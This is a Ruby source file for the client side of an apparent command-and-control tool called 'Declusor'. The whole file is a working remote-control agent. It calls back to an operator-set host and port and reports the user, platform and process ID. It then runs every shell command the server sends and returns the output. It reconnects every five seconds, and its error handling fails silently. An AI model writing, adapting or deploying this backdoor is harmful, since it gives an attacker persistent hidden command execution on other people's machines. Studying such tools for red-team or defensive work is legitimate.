#!/usr/bin/env ruby
# -----------------------------------------------------------------------------
# Declusor Ruby Client
# Implements the Declusor C2 Protocol (DCP).
# -----------------------------------------------------------------------------

require 'socket'
require 'open3'

# Configuration
HOST = ENV['HOST'] || '127.0.0.1'
PORT = (ENV['PORT'] || 4444).to_i

# DCP Message Types
MSG_AUTH_HELLO = 0x01
MSG_AUTH_ACK   = 0x02
MSG_CMD_EXEC   = 0x10
MSG_CMD_STDOUT = 0x11
MSG_CMD_STDERR = 0x12
MSG_CMD_EXIT   = 0x13
MSG_HEARTBEAT  = 0x20
MSG_TERM       = 0x99

def send_frame(sock, type, payload = "")
  length = payload.bytesize
  # Pack Length (4 bytes BE) and Type (1 byte)
  header = [length, type].pack("NC")
  sock.write(header + payload)
end

def recv_frame(sock)
  # Read Header
  header = sock.read(5)
  return nil, nil unless header && header.length == 5
  
  length, type = header.unpack("NC")
  
  # Read Payload
  payload = ""
  while payload.bytesize < length
    chunk = sock.read(length - payload.bytesize)
    return nil, nil unless chunk
    payload += chunk
  end
  
  return type, payload
end

loop do
  begin
    s = TCPSocket.new(HOST, PORT)
    
    # Handshake
    meta = "user=#{ENV['USER']}&os=#{RUBY_PLATFORM}&pid=#{Process.pid}"
    send_frame(s, MSG_AUTH_HELLO, meta)
    
    # Wait for ACK
    type, _ = recv_frame(s)
    if type != MSG_AUTH_ACK
      s.close
      sleep 5
      next
    end
    
    loop do
      type, payload = recv_frame(s)
      break unless type
      
      case type
      when MSG_CMD_EXEC
        cmd = payload
        begin
          stdin, stdout, stderr, wait_thr = Open3.popen3(cmd)
          
          # Read stdout
          while line = stdout.read(1024)
             send_frame(s, MSG_CMD_STDOUT, line) unless line.empty?
          end
          
          # Read stderr
          while line = stderr.read(1024)
             send_frame(s, MSG_CMD_STDERR, line) unless line.empty?
          end
          
          exit_code = wait_thr.value.exitstatus
          send_frame(s, MSG_CMD_EXIT, exit_code.to_s)
          
        rescue Exception => e
          send_frame(s, MSG_CMD_STDERR, e.message)
          send_frame(s, MSG_CMD_EXIT, "-1")
        end
        
      when MSG_HEARTBEAT
        send_frame(s, MSG_HEARTBEAT)
        
      when MSG_TERM
        break
      end
    end
    
    s.close
  rescue Exception
    # Silent fail
  end
  sleep 5
end
